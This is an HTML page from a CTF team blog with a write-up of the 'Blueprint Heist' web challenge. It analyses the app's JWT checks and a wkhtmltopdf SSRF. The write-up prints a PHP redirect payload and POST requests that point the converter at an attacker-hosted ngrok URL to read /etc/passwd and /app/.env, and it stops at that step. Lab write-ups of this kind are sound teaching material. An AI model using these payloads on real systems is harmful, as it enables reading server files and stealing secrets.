<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.769771249208">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.5.0">

    <!-- Primary Meta Tags -->
    <title>Blueprint Heist</title>
    <meta name="title" content="Blueprint Heist">
    <meta name="description" content="Challenge source file">

    <!-- Canonical -->
    <link rel="canonical" href="https://blogs.tamilctf.com/ctftime-writeups/htb_business/blueprint/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://blogs.tamilctf.com/ctftime-writeups/htb_business/blueprint/">
    <meta property="og:title" content="Blueprint Heist">
    <meta property="og:description" content="Challenge source file">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://blogs.tamilctf.com/ctftime-writeups/htb_business/blueprint/">
    <meta property="twitter:title" content="Blueprint Heist">
    <meta property="twitter:description" content="Challenge source file">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../assets/img/logo.png" rel="icon">
    <link href="../../../resources/css/retype.css?v=3.5.0.769771249208" rel="stylesheet">

    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.5.0.769771249208" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.5.0.769771249208" data-turbo-eval="false" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-2xl">
                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../assets/img/logo.png">
                                <img class="max-h-10 hidden dark:inline-block" src="../../../assets/img/logo.png">
                            </span>
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">TamilCTF</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Blogs</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../members/">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M3.5 8a5.5 5.5 0 1 1 8.596 4.547 9.005 9.005 0 0 1 5.9 8.18.751.751 0 0 1-1.5.045 7.5 7.5 0 0 0-14.993 0 .75.75 0 0 1-1.499-.044 9.005 9.005 0 0 1 5.9-8.181A5.496 5.496 0 0 1 3.5 8ZM9 4a4 4 0 1 0 0 8 4 4 0 0 0 0-8Zm8.29 4c-.148 0-.292.01-.434.03a.75.75 0 1 1-.212-1.484 4.53 4.53 0 0 1 3.38 8.097 6.69 6.69 0 0 1 3.956 6.107.75.75 0 0 1-1.5 0 5.193 5.193 0 0 0-3.696-4.972l-.534-.16v-1.676l.41-.209A3.03 3.03 0 0 0 17.29 8Z"/>
                                        </g>
                                    </svg>
                                    <span>Members</span>
                                </a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../sessions/">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M0 4.75C0 3.784.784 3 1.75 3h20.5c.966 0 1.75.784 1.75 1.75v14.5A1.75 1.75 0 0 1 22.25 21H1.75A1.75 1.75 0 0 1 0 19.25Zm1.75-.25a.25.25 0 0 0-.25.25v14.5c0 .138.112.25.25.25h20.5a.25.25 0 0 0 .25-.25V4.75a.25.25 0 0 0-.25-.25Z"/><path d="M9 15.584V8.416a.5.5 0 0 1 .77-.42l5.576 3.583a.5.5 0 0 1 0 .842L9.77 16.005a.5.5 0 0 1-.77-.42Z"/>
                                        </g>
                                    </svg>
                                    <span>Sessions</span>
                                </a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../members/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M3.5 8a5.5 5.5 0 1 1 8.596 4.547 9.005 9.005 0 0 1 5.9 8.18.751.751 0 0 1-1.5.045 7.5 7.5 0 0 0-14.993 0 .75.75 0 0 1-1.499-.044 9.005 9.005 0 0 1 5.9-8.181A5.496 5.496 0 0 1 3.5 8ZM9 4a4 4 0 1 0 0 8 4 4 0 0 0 0-8Zm8.29 4c-.148 0-.292.01-.434.03a.75.75 0 1 1-.212-1.484 4.53 4.53 0 0 1 3.38 8.097 6.69 6.69 0 0 1 3.956 6.107.75.75 0 0 1-1.5 0 5.193 5.193 0 0 0-3.696-4.972l-.534-.16v-1.676l.41-.209A3.03 3.03 0 0 0 17.29 8Z"/>
                                                </g>
                                            </svg>
                                            <span>Members</span>
                                        </a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../sessions/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M0 4.75C0 3.784.784 3 1.75 3h20.5c.966 0 1.75.784 1.75 1.75v14.5A1.75 1.75 0 0 1 22.25 21H1.75A1.75 1.75 0 0 1 0 19.25Zm1.75-.25a.25.25 0 0 0-.25.25v14.5c0 .138.112.25.25.25h20.5a.25.25 0 0 0 .25-.25V4.75a.25.25 0 0 0-.25-.25Z"/><path d="M9 15.584V8.416a.5.5 0 0 1 .77-.42l5.576 3.583a.5.5 0 0 1 0 .842L9.77 16.005a.5.5 0 0 1-.77-.42Z"/>
                                                </g>
                                            </svg>
                                            <span>Sessions</span>
                                        </a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <!-- Page content  -->
<doc-anchor-target id="blueprint-heist" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#blueprint-heist">#</doc-anchor-trigger>
        <span>Blueprint Heist</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
    <div class="flex items-center">
        <div>By</div>
        <div class="ml-2 flex items-center">
          <div class="shrink-0 w-8 h-8 overflow-hidden rounded-full">
            <svg width="2rem" height="2rem" xmlns="http://www.w3.org/2000/svg" fill="white"><g><rect width="2rem" height="1.7rem" fill="#c5c5c5"/><circle r="0.44rem" cy="0.83rem" cx="1rem"/><ellipse ry="0.96rem" rx="0.77rem" cy="2.15rem" cx="1rem"/></g></svg>
          </div>
          <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">0xgameov3r</div>
        </div>
    </div>
    <div class="mx-2">&#9679;</div>
    <div>In&nbsp;</div>
    <div><a href="../../../categories/hsctf/">HSCTF</a></div>
    <div class="mx-2">&#9679;</div>
    <div class="flex items-center shrink-0">Published&nbsp;<span>2024-05-23</span></div>
</div>

<doc-anchor-target id="blueprint-heist">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#blueprint-heist">#</doc-anchor-trigger>
        <span>Blueprint Heist</span>
    </h2>
</doc-anchor-target>
<img src="https://github.com/blog-tamilctf/blog-tamilctf.github.io/blob/main/assets/img/1.jpeg?raw=true" height=400px>
<ul>
<li><a href="https://github.com/kabilan1290/WebCTF/blob/master/HTB2024/BlueprintHeist/web_blueprint_heist.zip">Challenge source file</a></li>
</ul>
<doc-anchor-target id="initial-analysis">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#initial-analysis">#</doc-anchor-trigger>
        <span>Initial Analysis:</span>
    </h3>
</doc-anchor-target>
<ul>
<li>The challenge is placed in a medium web category, the first thing i noticed was routes, there were two routes <code v-pre>internal</code> and <code v-pre>public</code>.</li>
</ul>
<doc-anchor-target id="public-route">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#public-route">#</doc-anchor-trigger>
        <span>public route:</span>
    </h4>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">-----public.js-----
const express = require(&quot;express&quot;);
const router = express.Router();

const { authMiddleware, generateGuestToken } = require(&quot;../controllers/authController&quot;)
const { convertPdf } = require(&quot;../controllers/downloadController&quot;)

router.get(&quot;/&quot;, (req, res) =&gt; {
    res.render(&quot;index&quot;);
})

router.get(&quot;/report/progress&quot;, (req, res) =&gt; {
    res.render(&quot;reports/progress-report&quot;)
})

router.get(&quot;/report/enviromental-impact&quot;, (req, res) =&gt; {
    res.render(&quot;reports/enviromental-report&quot;)
})

router.get(&quot;/getToken&quot;, (req, res, next) =&gt; {
    generateGuestToken(req, res, next)
});

router.post(&quot;/download&quot;, authMiddleware(&quot;guest&quot;), (req, res, next) =&gt; {
    convertPdf(req, res, next)
})

module.exports = router;</code></pre>
</doc-codeblock></div>
<ul>
<li><code v-pre>/report/progress</code> and <code v-pre>/report/enviromental-impact</code> is not much of an use,the <code v-pre>/getToken</code> endpoint seems to generate a guest token and <code v-pre>/download</code> endpoint uses <code v-pre>authMiddleware(&quot;guest&quot;)</code> and convert some PDF we will look this soon.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">-----authController.js-----
const jwt = require('jsonwebtoken');

const { generateError } = require('../controllers/errorController');
const { checkInternal } = require(&quot;../utils/security&quot;)

const dotenv = require('dotenv');
dotenv.config();

const secret = process.env.secret

function verifyToken(token) {
    try {
        const decoded = jwt.verify(token, secret);
        return decoded.role;
    } catch (error) {
        return null
    }
}

const authMiddleware = (requiredRole) =&gt; {
    return (req, res, next) =&gt; {
        const token = req.query.token;

        if (!token) {
            return next(generateError(401, &quot;Access denied. Token is required.&quot;));
        }

        const role = verifyToken(token);

        if (!role) {
            return next(generateError(401, &quot;Invalid or expired token.&quot;));
        }

        if (requiredRole === &quot;admin&quot; &amp;&amp; role !== &quot;admin&quot;) {
            return next(generateError(401, &quot;Unauthorized.&quot;));
        } else if (requiredRole === &quot;admin&quot; &amp;&amp; role === &quot;admin&quot;) {
            if (!checkInternal(req)) {
                return next(generateError(403, &quot;Only available for internal users!&quot;));
            }
        }

        next();
    };
};

function generateGuestToken(req, res, next) {
    const payload = {
        role: 'user'
    };

    jwt.sign(payload, secret, (err, token) =&gt; {
        if (err) {
            next(generateError(500, &quot;Failed to generate token.&quot;));;
        } else {
            res.send(token);
        }
    });
}

module.exports = {authMiddleware, generateGuestToken}</code></pre>
</doc-codeblock></div>
<ul>
<li><code v-pre>const secret = process.env.secret</code> - importing secret from env file and uses it for jwt sign and verify.</li>
<li>When we call the <code v-pre>/getToken</code> endpoint, it uses the <code v-pre>generateGuestToken</code> to create a JWT for role user.</li>
<li><code v-pre>authMiddleware </code> - verifies the role specified in jwt and also there is additional check to verify if the user is admin <code v-pre>requiredRole === &quot;admin&quot; &amp;&amp; role === &quot;admin&quot;</code> and then it checks <code v-pre>checkInternal(req)</code></li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">----security.js-----
function checkInternal(req) {
    const address = req.socket.remoteAddress.replace(/^.*:/, '')
    return address === &quot;127.0.0.1&quot;
}</code></pre>
</doc-codeblock></div>
<ul>
<li><code v-pre>checkInternal(req)</code> seems to require the request to be orginating from 127.0.0.1.</li>
</ul>
<doc-anchor-target id="internal-route">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#internal-route">#</doc-anchor-trigger>
        <span>internal route:</span>
    </h4>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">const express = require(&quot;express&quot;);
const router = express.Router();

const { authMiddleware } = require(&quot;../controllers/authController&quot;)

const schema = require(&quot;../schemas/schema&quot;);
const pool = require(&quot;../utils/database&quot;)
const { createHandler } = require(&quot;graphql-http/lib/use/express&quot;);


router.get(&quot;/admin&quot;, authMiddleware(&quot;admin&quot;), (req, res) =&gt; {
    res.render(&quot;admin&quot;)
})

router.all(&quot;/graphql&quot;, authMiddleware(&quot;admin&quot;), (req, res, next) =&gt; {
    createHandler({ schema, context: { pool } })(req, res, next); 
});

module.exports = router;</code></pre>
</doc-codeblock></div>
<ul>
<li><code v-pre>/admin</code> and <code v-pre>/graphql</code> needs admin JWT authentication.</li>
</ul>
<doc-anchor-target id="initial-attack-with-gathered-information">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#initial-attack-with-gathered-information">#</doc-anchor-trigger>
        <span>Initial attack with gathered information</span>
    </h4>
</doc-anchor-target>
<ul>
<li>We start with using the <code v-pre>/getToken</code> endpoint to generate a user jwt token and supply in <code v-pre>router.post(&quot;/download&quot;, authMiddleware(&quot;guest&quot;)</code> download endpoint.</li>
</ul>
<p><code v-pre>$curl http://94.237.62.237:43315/getToken  /&gt;&gt;&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjI5OTY1M30.s54nJAARbBoidYio4dz7YsrsDrLfekrGaQ4DC_n1BY8</code></p>
<ul>
<li>We have the user token and lets inspect the download endpoint.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">const { generateError } = require('./errorController');
const { isUrl } = require(&quot;../utils/security&quot;)
const crypto = require('crypto');
const wkhtmltopdf = require('wkhtmltopdf');

async function convertPdf(req, res, next) {
    try {
        const { url } = req.body;

        if (!isUrl(url)) {
            return next(generateError(400, &quot;Invalid URL&quot;));
        }

        const pdfPath = await generatePdf(url);
        res.sendFile(pdfPath, {root: &quot;.&quot;});

    } catch (error) {
        return next(generateError(500, error.message));
    }
}

async function generatePdf(urls) {
    const pdfFilename = generateRandomFilename();
    const pdfPath = `uploads/${pdfFilename}`;

    try {
        await generatePdfFromUrl(urls, pdfPath);
        return pdfPath;
    } catch (error) {
        throw new Error(`Error generating PDF: ${error.stack}`);
    }
}

async function generatePdfFromUrl(url, pdfPath) {
    return new Promise((resolve, reject) =&gt; {
        wkhtmltopdf(url, { output: pdfPath }, (err) =&gt; {
            if (err) {
                console.log(err)
                reject(err);
            } else {
                resolve();
            }
        });
    });
}

function generateRandomFilename() {
    const randomString = crypto.randomBytes(16).toString('hex');
    return `${randomString}.pdf`;
}

module.exports = { convertPdf };</code></pre>
</doc-codeblock></div>
<ul>
<li>It gets <code v-pre>const { url } = req.body;</code> url from the POST body and convert it to PDF using <code v-pre>wkhtmltopdf</code> ! hmmm.....interesting</li>
<li>I tried <code v-pre>https://google.com</code> and its contents are converted into pdf.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=https://google.com</code></pre>
</doc-codeblock></div>
<ul>
<li>While trying this, i got stucked in a rabbit hole out of nowhere.</li>
</ul>
<doc-anchor-target id="the-rabbithole-out-of-nowhere">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#the-rabbithole-out-of-nowhere">#</doc-anchor-trigger>
        <span>The rabbithole out of nowhere:</span>
    </h4>
</doc-anchor-target>
<ul>
<li>while i looking through the files,i found <code v-pre>.env</code> file have been provided to us!</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=D4T4b4s3Secr3tP4ssw0rd1ss0L0ngOmG!
DB_NAME=construction
DB_PORT=3306
secret=IM_Sup3r_K3y_pl3ase_b3_c4r3ful?</code></pre>
</doc-codeblock></div>
<ul>
<li>The DB password and secret seemed valid, so i ceased my progress and went on creating admin JWT with the found secret.</li>
<li>I tried to verify my crafted admin token and found it was <code v-pre>invalid or expired token.</code></li>
</ul>
<p><code v-pre>GET /admin?token=&lt;token&gt;</code></p>
<ul>
<li>Trying multiple things for a while,then i thought of verifying the guest token locally with the secret ! IT FAILEDDDDD!</li>
</ul>
<p>&lt;img/src=&quot;node.jpeg&quot;&gt;</img></p>
<ul>
<li>It was not the legit secret ! ahhh getting back to my old progress.</li>
</ul>
<doc-anchor-target id="getting-back-to-the-download-endpoint">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#getting-back-to-the-download-endpoint">#</doc-anchor-trigger>
        <span>Getting back to the <code v-pre>/download</code> endpoint:</span>
    </h4>
</doc-anchor-target>
<ul>
<li><p>Upon analysing the <code v-pre>wkhtmltopdf</code> version through produced pdf <code v-pre>wkhtmltopdf 0.12.5</code>,there is an SSRF vulnerability and we can read local files with it.</p>
</li>
<li><p>Exploit : <a href="https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/">https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/</a></p>
</li>
<li><p>We need to host a php file <code v-pre>&lt;?php header('location:file://'.$_REQUEST['x']); ?&gt; </code> and call it the post url to trigger the ssrf.</p>
</li>
<li><p><code v-pre>url=http://ngrok_url/test.php?x=/etc/passwd</code></p>
</li>
<li><p>The idea is to read the real secret inside <code v-pre>/app/.env</code> through the ssrf and forge the admin token for further exploitation.</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">POST /download?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcxNjIxMDUzMX0.2gwPTRqbPfj4Axbz2B3t4HNWHHdcgIXgTCcCyGaupW0 HTTP/1.1
Host: host:30586
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

url=http://ngrok_url/test.php?x=/app/.env</code></pre>
